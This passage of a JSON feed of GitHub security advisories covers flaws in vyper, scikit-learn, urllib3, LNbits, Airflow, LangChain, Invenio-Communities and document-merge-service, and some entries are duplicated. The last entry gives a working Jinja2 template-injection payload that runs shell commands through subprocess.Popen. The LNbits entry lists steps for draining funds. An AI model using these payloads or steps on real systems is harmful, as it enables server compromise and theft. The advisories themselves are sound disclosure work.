            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Incorrect values can be logged when <code>raw_log</code> builtin is called with memory or storage arguments to be used as topics.</p>\n<p>A contract search was performed and no vulnerable contracts were found in production. In particular, no uses of <code>raw_log()</code> were found at all in production; it is apparently not a well-known function.</p>\n<h3 id=\"details\">Details</h3>\n<p>The <code>build_IR</code> function of the <code>RawLog</code> class fails to properly unwrap the variables provided as topics. Consequently, incorrect values are logged as topics.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-vyper\">x: bytes32\n\n@external\ndef f():\n    self.x = 0x1234567890123456789012345678901234567890123456789012345678901234\n    raw_log([self.x], b\"\") # LOG1(offset:0x60, size:0x00, topic1:0x00)\n\n    y: bytes32 = 0x1234567890123456789012345678901234567890123456789012345678901234\n    raw_log([y], b\"\") # LOG1(offset:0x80, size:0x00, topic1:0x40)\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in <a href=\"https://github.com/vyperlang/vyper/pull/3977\">https://github.com/vyperlang/vyper/pull/3977</a>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Incorrect values can be logged which may result in unexpected behavior in client-side applications relying on these logs.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-xchq-w5r3-4wg3\">https://github.com/vyperlang/vyper/security/advisories/GHSA-xchq-w5r3-4wg3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-32645\">https://nvd.nist.gov/vuln/detail/CVE-2024-32645</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xchq-w5r3-4wg3\">https://github.com/advisories/GHSA-xchq-w5r3-4wg3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xchq-w5r3-4wg3",
            "title": "[vyper] vyper performs incorrect topic logging in raw_log",
            "date_modified": "2024-06-18T15:01:25.000Z",
            "date_published": "2024-04-25T19:53:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xchq-w5r3-4wg3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A sensitive data leakage vulnerability was identified in scikit-learn's TfidfVectorizer, specifically in versions up to and including 1.4.1.post1, which was fixed in version 1.5.0. The vulnerability arises from the unexpected storage of all tokens present in the training data within the <code>stop_words_</code> attribute, rather than only storing the subset of tokens required for the TF-IDF technique to function. This behavior leads to the potential leakage of sensitive information, as the <code>stop_words_</code> attribute could contain tokens that were meant to be discarded and not stored, such as passwords or keys. The impact of this vulnerability varies based on the nature of the data being processed by the vectorizer.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-5206\">https://nvd.nist.gov/vuln/detail/CVE-2024-5206</a></li>\n<li><a href=\"https://github.com/scikit-learn/scikit-learn/commit/70ca21f106b603b611da73012c9ade7cd8e438b8\">https://github.com/scikit-learn/scikit-learn/commit/70ca21f106b603b611da73012c9ade7cd8e438b8</a></li>\n<li><a href=\"https://huntr.com/bounties/14bc0917-a85b-4106-a170-d09d5191517c\">https://huntr.com/bounties/14bc0917-a85b-4106-a170-d09d5191517c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jw8x-6495-233v\">https://github.com/advisories/GHSA-jw8x-6495-233v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jw8x-6495-233v",
            "title": "[scikit-learn] scikit-learn sensitive data leakage vulnerability",
            "date_modified": "2024-06-17T22:31:09.000Z",
            "date_published": "2024-06-06T21:30:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jw8x-6495-233v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>When using urllib3's proxy support with <code>ProxyManager</code>, the <code>Proxy-Authorization</code> header is only sent to the configured proxy, as expected.</p>\n<p>However, when sending HTTP requests <em>without</em> using urllib3's proxy support, it's possible to accidentally configure the <code>Proxy-Authorization</code> header even though it won't have any effect as the request is not using a forwarding proxy or a tunneling proxy. In those cases, urllib3 doesn't treat the <code>Proxy-Authorization</code> HTTP header as one carrying authentication material and thus doesn't strip the header on cross-origin redirects.</p>\n<p>Because this is a highly unlikely scenario, we believe the severity of this vulnerability is low for almost all users. Out of an abundance of caution urllib3 will automatically strip the <code>Proxy-Authorization</code> header during cross-origin redirects to avoid the small chance that users are doing this on accident.</p>\n<p>Users should use urllib3's proxy support or disable automatic redirects to achieve safe processing of the <code>Proxy-Authorization</code> header, but we still decided to strip the header by default in order to further protect users who aren't using the correct approach.</p>\n<h2 id=\"affected-usages\">Affected usages</h2>\n<p>We believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:</p>\n<ul>\n<li>Setting the <code>Proxy-Authorization</code> header without using urllib3's built-in proxy support.</li>\n<li>Not disabling HTTP redirects.</li>\n<li>Either not using an HTTPS origin server or for the proxy or target origin to redirect to a malicious origin.</li>\n</ul>\n<h2 id=\"remediation\">Remediation</h2>\n<ul>\n<li>Using the <code>Proxy-Authorization</code> header with urllib3's <code>ProxyManager</code>.</li>\n<li>Disabling HTTP redirects using <code>redirects=False</code> when sending requests.</li>\n<li>Not using the <code>Proxy-Authorization</code> header.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/urllib3/urllib3/security/advisories/GHSA-34jh-p97f-mpxf\">https://github.com/urllib3/urllib3/security/advisories/GHSA-34jh-p97f-mpxf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37891\">https://nvd.nist.gov/vuln/detail/CVE-2024-37891</a></li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/40b6d1605814dd1db0a46e202d6e56f2e4c9a468\">https://github.com/urllib3/urllib3/commit/40b6d1605814dd1db0a46e202d6e56f2e4c9a468</a></li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/accff72ecc2f6cf5a76d9570198a93ac7c90270e\">https://github.com/urllib3/urllib3/commit/accff72ecc2f6cf5a76d9570198a93ac7c90270e</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-34jh-p97f-mpxf\">https://github.com/advisories/GHSA-34jh-p97f-mpxf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-34jh-p97f-mpxf",
            "title": "[urllib3] urllib3's Proxy-Authorization request header isn't stripped during cross-origin redirects ",
            "date_modified": "2024-06-17T21:37:23.000Z",
            "date_published": "2024-06-17T21:37:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-34jh-p97f-mpxf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>When using urllib3's proxy support with <code>ProxyManager</code>, the <code>Proxy-Authorization</code> header is only sent to the configured proxy, as expected.</p>\n<p>However, when sending HTTP requests <em>without</em> using urllib3's proxy support, it's possible to accidentally configure the <code>Proxy-Authorization</code> header even though it won't have any effect as the request is not using a forwarding proxy or a tunneling proxy. In those cases, urllib3 doesn't treat the <code>Proxy-Authorization</code> HTTP header as one carrying authentication material and thus doesn't strip the header on cross-origin redirects.</p>\n<p>Because this is a highly unlikely scenario, we believe the severity of this vulnerability is low for almost all users. Out of an abundance of caution urllib3 will automatically strip the <code>Proxy-Authorization</code> header during cross-origin redirects to avoid the small chance that users are doing this on accident.</p>\n<p>Users should use urllib3's proxy support or disable automatic redirects to achieve safe processing of the <code>Proxy-Authorization</code> header, but we still decided to strip the header by default in order to further protect users who aren't using the correct approach.</p>\n<h2 id=\"affected-usages\">Affected usages</h2>\n<p>We believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:</p>\n<ul>\n<li>Setting the <code>Proxy-Authorization</code> header without using urllib3's built-in proxy support.</li>\n<li>Not disabling HTTP redirects.</li>\n<li>Either not using an HTTPS origin server or for the proxy or target origin to redirect to a malicious origin.</li>\n</ul>\n<h2 id=\"remediation\">Remediation</h2>\n<ul>\n<li>Using the <code>Proxy-Authorization</code> header with urllib3's <code>ProxyManager</code>.</li>\n<li>Disabling HTTP redirects using <code>redirects=False</code> when sending requests.</li>\n<li>Not using the <code>Proxy-Authorization</code> header.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/urllib3/urllib3/security/advisories/GHSA-34jh-p97f-mpxf\">https://github.com/urllib3/urllib3/security/advisories/GHSA-34jh-p97f-mpxf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37891\">https://nvd.nist.gov/vuln/detail/CVE-2024-37891</a></li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/40b6d1605814dd1db0a46e202d6e56f2e4c9a468\">https://github.com/urllib3/urllib3/commit/40b6d1605814dd1db0a46e202d6e56f2e4c9a468</a></li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/accff72ecc2f6cf5a76d9570198a93ac7c90270e\">https://github.com/urllib3/urllib3/commit/accff72ecc2f6cf5a76d9570198a93ac7c90270e</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-34jh-p97f-mpxf\">https://github.com/advisories/GHSA-34jh-p97f-mpxf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-34jh-p97f-mpxf",
            "title": "[urllib3] urllib3's Proxy-Authorization request header isn't stripped during cross-origin redirects ",
            "date_modified": "2024-06-17T21:37:23.000Z",
            "date_published": "2024-06-17T21:37:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-34jh-p97f-mpxf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Paying invoices in Eclair that do not get settled within the internal timeout (about 30s) lead to a payment being considered failed, even though it may still be in flight.</p>\n<h3 id=\"details\">Details</h3>\n<p>Using <code>blocking: true</code> on the API call will lead to a timeout error if a payment does not get settled in the 30s timeout with the error: <code>Ask timed out on [Actor[akka://eclair-node/user/$l#134241942]] after [30000 ms]. Message of type [fr.acinq.eclair.payment.send.PaymentInitiator$SendPaymentToNode]. A typical reason for AskTimeoutException is that the recipient actor didn't send a reply.</code>\n<a href=\"https://github.com/lnbits/lnbits/blob/c04c13b2f8cfbb625571a07dfddeb65ea6df8dac/lnbits/wallets/eclair.py#L138\">https://github.com/lnbits/lnbits/blob/c04c13b2f8cfbb625571a07dfddeb65ea6df8dac/lnbits/wallets/eclair.py#L138</a></p>\n<p>This is considered a payment failure by parts of the code, and assumes the payment is not going to be settled after:\n<a href=\"https://github.com/lnbits/lnbits/blob/c04c13b2f8cfbb625571a07dfddeb65ea6df8dac/lnbits/wallets/eclair.py#L144\">https://github.com/lnbits/lnbits/blob/c04c13b2f8cfbb625571a07dfddeb65ea6df8dac/lnbits/wallets/eclair.py#L144</a>\n<a href=\"https://github.com/lnbits/lnbits/blob/c04c13b2f8cfbb625571a07dfddeb65ea6df8dac/lnbits/wallets/eclair.py#L141\">https://github.com/lnbits/lnbits/blob/c04c13b2f8cfbb625571a07dfddeb65ea6df8dac/lnbits/wallets/eclair.py#L141</a>\n<a href=\"https://github.com/lnbits/lnbits/blob/c04c13b2f8cfbb625571a07dfddeb65ea6df8dac/lnbits/wallets/eclair.py#L146\">https://github.com/lnbits/lnbits/blob/c04c13b2f8cfbb625571a07dfddeb65ea6df8dac/lnbits/wallets/eclair.py#L146</a></p>\n<p>The best way to fix this is to check the payment status after an error, and when not sure, always consider a payment still in flight.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>A very simple way to exploit this is:</p>\n<ul>\n<li>Create a hold invoice</li>\n<li>Pay the invoice with the LNbits server backed by an Eclair node, until it times out</li>\n<li>Settle the hold invoice</li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability can lead to a total loss of funds for the node backend.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/lnbits/lnbits/security/advisories/GHSA-3j4h-h3fp-vwww\">https://github.com/lnbits/lnbits/security/advisories/GHSA-3j4h-h3fp-vwww</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-34694\">https://nvd.nist.gov/vuln/detail/CVE-2024-34694</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3j4h-h3fp-vwww\">https://github.com/advisories/GHSA-3j4h-h3fp-vwww</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3j4h-h3fp-vwww",
            "title": "[lnbits] LNbits improperly handles potential network and payment failures when using Eclair backend",
            "date_modified": "2024-06-17T21:24:18.000Z",
            "date_published": "2024-06-17T21:24:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3j4h-h3fp-vwww"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Use of Web Browser Cache Containing Sensitive Information vulnerability in Apache Airflow.&nbsp;</p>\n<p>Airflow did not return \"Cache-Control\" header for dynamic content, which in case of some browsers could result in potentially storing sensitive data in local cache of the browser.</p>\n<p>This issue affects Apache Airflow: before 2.9.2.</p>\n<p>Users are recommended to upgrade to version 2.9.2, which fixes the issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-25142\">https://nvd.nist.gov/vuln/detail/CVE-2024-25142</a></li>\n<li><a href=\"https://github.com/apache/airflow/pull/39550\">https://github.com/apache/airflow/pull/39550</a></li>\n<li><a href=\"https://lists.apache.org/thread/cg1j28lk0fhzthk0of1g7vy7p2n1j7nr\">https://lists.apache.org/thread/cg1j28lk0fhzthk0of1g7vy7p2n1j7nr</a></li>\n<li><a href=\"https://github.com/apache/airflow/commit/94eb647de692a4d9555b02dce85974da5d4c04e3\">https://github.com/apache/airflow/commit/94eb647de692a4d9555b02dce85974da5d4c04e3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9xpj-62mm-24h2\">https://github.com/advisories/GHSA-9xpj-62mm-24h2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9xpj-62mm-24h2",
            "title": "[apache-airflow] Apache Airflow does not return the \"Cache-Control\" header for dynamic content",
            "date_modified": "2024-06-17T21:24:09.000Z",
            "date_published": "2024-06-14T09:31:17.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9xpj-62mm-24h2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>langchain_experimental (aka LangChain Experimental) before 0.0.61 for LangChain provides Python REPL access without an opt-in step. NOTE; this issue exists because of an incomplete fix for CVE-2024-27444.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-38459\">https://nvd.nist.gov/vuln/detail/CVE-2024-38459</a></li>\n<li><a href=\"https://github.com/langchain-ai/langchain/pull/22860\">https://github.com/langchain-ai/langchain/pull/22860</a></li>\n<li><a href=\"https://github.com/langchain-ai/langchain/commit/ce0b0f22a175139df8f41cdcfb4d2af411112009\">https://github.com/langchain-ai/langchain/commit/ce0b0f22a175139df8f41cdcfb4d2af411112009</a></li>\n<li><a href=\"https://github.com/langchain-ai/langchain/compare/langchain-experimental==0.0.60...langchain-experimental==0.0.61\">https://github.com/langchain-ai/langchain/compare/langchain-experimental==0.0.60...langchain-experimental==0.0.61</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/langchain-experimental/PYSEC-2024-53.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/langchain-experimental/PYSEC-2024-53.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wmvm-9vqv-5qpp\">https://github.com/advisories/GHSA-wmvm-9vqv-5qpp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wmvm-9vqv-5qpp",
            "title": "[langchain-experimental] langchain_experimental Code Execution via Python REPL access",
            "date_modified": "2024-06-17T21:21:49.000Z",
            "date_published": "2024-06-16T15:30:44.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wmvm-9vqv-5qpp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Denial of service in <code>SitemapLoader</code> Document Loader in the <code>langchain-community</code> package, affecting versions below 0.2.5. The <code>parse_sitemap</code> method, responsible for parsing sitemaps and extracting URLs, lacks a mechanism to prevent infinite recursion when a sitemap URL refers to the current sitemap itself. This oversight allows for the possibility of an infinite loop, leading to a crash by exceeding the maximum recursion depth in Python. This vulnerability can be exploited to occupy server socket/port resources and crash the Python process, impacting the availability of services relying on this functionality.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-2965\">https://nvd.nist.gov/vuln/detail/CVE-2024-2965</a></li>\n<li><a href=\"https://huntr.com/bounties/90b0776d-9fa6-4841-aac4-09fde5918cae\">https://huntr.com/bounties/90b0776d-9fa6-4841-aac4-09fde5918cae</a></li>\n<li><a href=\"https://github.com/langchain-ai/langchain/pull/22903\">https://github.com/langchain-ai/langchain/pull/22903</a></li>\n<li><a href=\"https://github.com/langchain-ai/langchain/commit/9a877c7adbd06f90a2518152f65b562bd90487cc\">https://github.com/langchain-ai/langchain/commit/9a877c7adbd06f90a2518152f65b562bd90487cc</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3hjh-jh2h-vrg6\">https://github.com/advisories/GHSA-3hjh-jh2h-vrg6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3hjh-jh2h-vrg6",
            "title": "[langchain-community] Denial of service in langchain-community",
            "date_modified": "2024-06-14T23:25:32.000Z",
            "date_published": "2024-06-06T21:30:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3hjh-jh2h-vrg6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"impact\">Impact</h1>\n<p>We have identified a Cross-Site Scripting (XSS) vulnerability within certain React components related to community members in the Invenio-Communities module. This vulnerability enables a user to inject a script tag into the Affiliations field during the account registration process. The malicious script is executed when the user creates a new community and is listed as a public member.</p>\n<p>The script is triggered whenever any user visits the Members section of any community that includes the compromised user. This can potentially allow the attacker to access personal information, such as cookies, of the visiting user.</p>\n<h1 id=\"patches\">Patches</h1>\n<p>The problem has been patched in <a href=\"https://github.com/inveniosoftware/invenio-communities/releases/tag/v7.8.0\">v7.8.0</a>. Patches also have been backported in versions <a href=\"https://github.com/inveniosoftware/invenio-communities/tree/v4.2.2\">v4.2.2</a> and <a href=\"https://github.com/inveniosoftware/invenio-communities/tree/v2.8.11\">v2.8.11</a>.</p>\n<h1 id=\"credits\">Credits</h1>\n<p>Thanks to <a href=\"https://x.com/AliGoodLuck11\">Twitter.com/AliGoodLuck11</a>  for reporting the vulnerability with a detailed description on how to reproduce it!</p>\n<h1 id=\"for-more-information\">For more information</h1>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Email us at <a href=\"mailto:info@inveniosoftware.org\">info@inveniosoftware.org</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/security/advisories/GHSA-hjx6-f647-mvf9\">https://github.com/inveniosoftware/invenio-communities/security/advisories/GHSA-hjx6-f647-mvf9</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/4424dd5112818992b82ae42d4c4f89089502b35f\">https://github.com/inveniosoftware/invenio-communities/commit/4424dd5112818992b82ae42d4c4f89089502b35f</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/6a47db9404c51134634b3905f62f612b4a976698\">https://github.com/inveniosoftware/invenio-communities/commit/6a47db9404c51134634b3905f62f612b4a976698</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/817b8208f5ce262f45eab32832d90b80dc7d3fce\">https://github.com/inveniosoftware/invenio-communities/commit/817b8208f5ce262f45eab32832d90b80dc7d3fce</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/b89442c9d57421a88dd0aa89a404ba89d1a22cac\">https://github.com/inveniosoftware/invenio-communities/commit/b89442c9d57421a88dd0aa89a404ba89d1a22cac</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hjx6-f647-mvf9\">https://github.com/advisories/GHSA-hjx6-f647-mvf9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hjx6-f647-mvf9",
            "title": "[invenio-communities] Invenio-Communities has a Cross-Site Scripting (XSS) vulnerability in React components",
            "date_modified": "2024-06-12T19:43:05.000Z",
            "date_published": "2024-06-12T19:43:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hjx6-f647-mvf9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"impact\">Impact</h1>\n<p>We have identified a Cross-Site Scripting (XSS) vulnerability within certain React components related to community members in the Invenio-Communities module. This vulnerability enables a user to inject a script tag into the Affiliations field during the account registration process. The malicious script is executed when the user creates a new community and is listed as a public member.</p>\n<p>The script is triggered whenever any user visits the Members section of any community that includes the compromised user. This can potentially allow the attacker to access personal information, such as cookies, of the visiting user.</p>\n<h1 id=\"patches\">Patches</h1>\n<p>The problem has been patched in <a href=\"https://github.com/inveniosoftware/invenio-communities/releases/tag/v7.8.0\">v7.8.0</a>. Patches also have been backported in versions <a href=\"https://github.com/inveniosoftware/invenio-communities/tree/v4.2.2\">v4.2.2</a> and <a href=\"https://github.com/inveniosoftware/invenio-communities/tree/v2.8.11\">v2.8.11</a>.</p>\n<h1 id=\"credits\">Credits</h1>\n<p>Thanks to <a href=\"https://x.com/AliGoodLuck11\">Twitter.com/AliGoodLuck11</a>  for reporting the vulnerability with a detailed description on how to reproduce it!</p>\n<h1 id=\"for-more-information\">For more information</h1>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Email us at <a href=\"mailto:info@inveniosoftware.org\">info@inveniosoftware.org</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/security/advisories/GHSA-hjx6-f647-mvf9\">https://github.com/inveniosoftware/invenio-communities/security/advisories/GHSA-hjx6-f647-mvf9</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/4424dd5112818992b82ae42d4c4f89089502b35f\">https://github.com/inveniosoftware/invenio-communities/commit/4424dd5112818992b82ae42d4c4f89089502b35f</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/6a47db9404c51134634b3905f62f612b4a976698\">https://github.com/inveniosoftware/invenio-communities/commit/6a47db9404c51134634b3905f62f612b4a976698</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/817b8208f5ce262f45eab32832d90b80dc7d3fce\">https://github.com/inveniosoftware/invenio-communities/commit/817b8208f5ce262f45eab32832d90b80dc7d3fce</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/b89442c9d57421a88dd0aa89a404ba89d1a22cac\">https://github.com/inveniosoftware/invenio-communities/commit/b89442c9d57421a88dd0aa89a404ba89d1a22cac</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hjx6-f647-mvf9\">https://github.com/advisories/GHSA-hjx6-f647-mvf9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hjx6-f647-mvf9",
            "title": "[invenio-communities] Invenio-Communities has a Cross-Site Scripting (XSS) vulnerability in React components",
            "date_modified": "2024-06-12T19:43:05.000Z",
            "date_published": "2024-06-12T19:43:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hjx6-f647-mvf9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"impact\">Impact</h1>\n<p>We have identified a Cross-Site Scripting (XSS) vulnerability within certain React components related to community members in the Invenio-Communities module. This vulnerability enables a user to inject a script tag into the Affiliations field during the account registration process. The malicious script is executed when the user creates a new community and is listed as a public member.</p>\n<p>The script is triggered whenever any user visits the Members section of any community that includes the compromised user. This can potentially allow the attacker to access personal information, such as cookies, of the visiting user.</p>\n<h1 id=\"patches\">Patches</h1>\n<p>The problem has been patched in <a href=\"https://github.com/inveniosoftware/invenio-communities/releases/tag/v7.8.0\">v7.8.0</a>. Patches also have been backported in versions <a href=\"https://github.com/inveniosoftware/invenio-communities/tree/v4.2.2\">v4.2.2</a> and <a href=\"https://github.com/inveniosoftware/invenio-communities/tree/v2.8.11\">v2.8.11</a>.</p>\n<h1 id=\"credits\">Credits</h1>\n<p>Thanks to <a href=\"https://x.com/AliGoodLuck11\">Twitter.com/AliGoodLuck11</a>  for reporting the vulnerability with a detailed description on how to reproduce it!</p>\n<h1 id=\"for-more-information\">For more information</h1>\n<p>If you have any questions or comments about this advisory:</p>\n<p>Email us at <a href=\"mailto:info@inveniosoftware.org\">info@inveniosoftware.org</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/security/advisories/GHSA-hjx6-f647-mvf9\">https://github.com/inveniosoftware/invenio-communities/security/advisories/GHSA-hjx6-f647-mvf9</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/4424dd5112818992b82ae42d4c4f89089502b35f\">https://github.com/inveniosoftware/invenio-communities/commit/4424dd5112818992b82ae42d4c4f89089502b35f</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/6a47db9404c51134634b3905f62f612b4a976698\">https://github.com/inveniosoftware/invenio-communities/commit/6a47db9404c51134634b3905f62f612b4a976698</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/817b8208f5ce262f45eab32832d90b80dc7d3fce\">https://github.com/inveniosoftware/invenio-communities/commit/817b8208f5ce262f45eab32832d90b80dc7d3fce</a></li>\n<li><a href=\"https://github.com/inveniosoftware/invenio-communities/commit/b89442c9d57421a88dd0aa89a404ba89d1a22cac\">https://github.com/inveniosoftware/invenio-communities/commit/b89442c9d57421a88dd0aa89a404ba89d1a22cac</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hjx6-f647-mvf9\">https://github.com/advisories/GHSA-hjx6-f647-mvf9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hjx6-f647-mvf9",
            "title": "[invenio-communities] Invenio-Communities has a Cross-Site Scripting (XSS) vulnerability in React components",
            "date_modified": "2024-06-12T19:43:05.000Z",
            "date_published": "2024-06-12T19:43:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hjx6-f647-mvf9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em></p>\n<p>A remote code execution (RCE) via server-side template injection (SSTI) allows for user supplied code to be executed in the server's context where it is executed as the document-merge-server user with the UID 901 thus giving an attacker considerable control over the container.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p>It has not been patched.</p>\n<h3 id=\"references\">References</h3>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<ul>\n<li><a href=\"https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti\">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti</a></li>\n</ul>\n<h3 id=\"poc\">POC</h3>\n<p>Add the following to a document, upload and render it:</p>\n<pre><code class=\"language-jinja2\">{% if PLACEHOLDER.__class__.__mro__[1].__subclasses__()[202] %} \nls -a: {{ PLACEHOLDER.__class__.__mro__[1].__subclasses__()[202](\"ls -a\", shell=True, stdout=-1).communicate()[0].strip() }}\n\nwhoami: {{ PLACEHOLDER.__class__.__mro__[1].__subclasses__()[202](\"whoami\", shell=True, stdout=-1).communicate()[0].strip() }}\n\nuname -a:\n{{ PLACEHOLDER.__class__.__mro__[1].__subclasses__()[202](\"uname -a\", shell=True, stdout=-1).communicate()[0].strip() }}\n\n{% endif %}\n</code></pre>\n<p>The index might be different, so to debug this first render a template with <code>{{ PLACEHOLDER.__class__.__mro__[1].__subclasses__() }}</code> and then get the index of <code>subprocess.Popen</code> and replace 202 with that.</p>\n<p><img alt=\"image\" src=\"https://github.com/adfinis/document-merge-service/assets/110528300/0a1dfcff-2eba-40f1-af9c-08c8ec2bc0a1\"></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/adfinis/document-merge-service/security/advisories/GHSA-v5gf-r78h-55q6\">https://github.com/adfinis/document-merge-service/security/advisories/GHSA-v5gf-r78h-55q6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37301\">https://nvd.nist.gov/vuln/detail/CVE-2024-37301</a></li>\n<li><a href=\"https://github.com/adfinis/document-merge-service/commit/a1edd39d33d1bdf75c31ea01c317547be90ca074\">https://github.com/adfinis/document-merge-service/commit/a1edd39d33d1bdf75c31ea01c317547be90ca074</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v5gf-r78h-55q6\">https://github.com/advisories/GHSA-v5gf-r78h-55q6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v5gf-r78h-55q6",
            "title": "[document-merge-service] document-merge-service vulnerable to Remote Code Execution via Server-Side Template Injection",
            "date_modified": "2024-06-12T19:21:02.000Z",
            "date_published": "2024-06-11T20:22:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v5gf-r78h-55q6"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}